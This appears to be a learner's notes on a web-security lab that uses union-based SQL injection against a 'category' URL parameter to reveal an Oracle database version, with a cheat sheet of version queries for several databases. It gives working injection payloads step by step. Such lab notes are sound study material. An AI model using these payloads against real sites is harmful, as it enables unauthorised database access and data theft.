Get the DB Type and Version.

Provided cheatsheet below should assist:

Oracle
`SELECT banner FROM v$version  
SELECT version FROM v$instance  
`
Microsoft
`SELECT @@version`
PostgreSQL
`SELECT version()`
MySQL
`SELECT @@version`



with a union based sql injection first step is to 
(1) determine number of columns- from the lab prompt we can assume two but for demonstration purposes I entered:

 'ORDER BY 2--
 
 Full:
/filter?category=Pets' ORDER BY 2--

(2) Find out what data it accepts. You can do this with ' UNION SELECT NULL, 'a'--

I received an error here because the DB is Oracle and every SELECT query must use the FROM keyword.
Most Oracle DB will allow you to use the table dual.

After finding out which fields accept text 
(3) Next step is to try out a few queries. I did the following:
category=Pets' UNION SELECT 'a',NULL FROM dual-- 
this let me know I could put BANNER in for 'a'

I then did:
'UNION SELECT BANNER, NULL FROM v$version--

and the query successfully returned the DB version
